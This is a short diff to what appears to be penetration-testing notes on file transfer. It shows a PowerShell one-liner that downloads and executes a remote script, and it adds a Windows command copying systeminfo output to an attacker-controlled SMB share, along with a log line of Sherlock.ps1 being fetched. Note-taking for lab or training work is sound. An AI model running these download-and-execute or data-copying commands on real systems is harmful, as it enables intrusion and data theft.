@@ -128,3 +128,13 @@ And with PowerShell
 
 IEX(curl http://server/script.ps1);Invoke-Blah
 ```
+
+	
+	
+	
+```
+c:\Users\Public\Downloads>copy systeminfo_1.txt \\192.168.119.194\kali\tmp\                                                                                                                  │10.11.1.13 - - [20/Feb/2022 10:57:52] "GET /Sherlock.ps1 HTTP/1.1" 200 -
+copy systeminfo_1.txt \\192.168.119.194\kali\tmp\     
+```
+	
+	https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
